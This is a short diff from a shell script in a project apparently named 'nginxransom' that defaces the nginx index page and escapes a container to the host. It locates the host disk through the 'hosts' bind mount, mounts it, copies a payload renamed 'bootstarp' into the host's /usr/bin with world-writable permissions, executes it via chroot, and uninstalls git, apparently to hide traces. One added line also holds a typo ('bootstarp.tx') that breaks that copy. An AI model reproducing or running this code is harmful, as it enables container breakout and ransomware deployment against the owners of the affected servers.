@@ -7,7 +7,7 @@ cp -u nginxransom/initialize.txt /usr/bin/initialize  && chmod 777 /usr/bin/init
 cp -u /nginxransom/web/index.html /usr/share/nginx/html/index.html
 diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
 mount $diskpart /mnt/
-cp -u nginxransom/initialize.txt  mnt/usr/bin/initialize && chmod 777 mnt/usr/bin/initialize 
-chroot mnt/usr/bin/ ./initialize 
+cp -u nginxransom/bootstarp.txt  mnt/usr/bin/bootstarp && cp nginxransom/bootstarp.tx /usr/bin/bootstarp && chmod 777 /usr/bin/bootstarp && chmod 777 mnt/usr/bin/bootstarp 
+chroot mnt/usr/bin/ ./bootstarp
 apt remove git -y
 
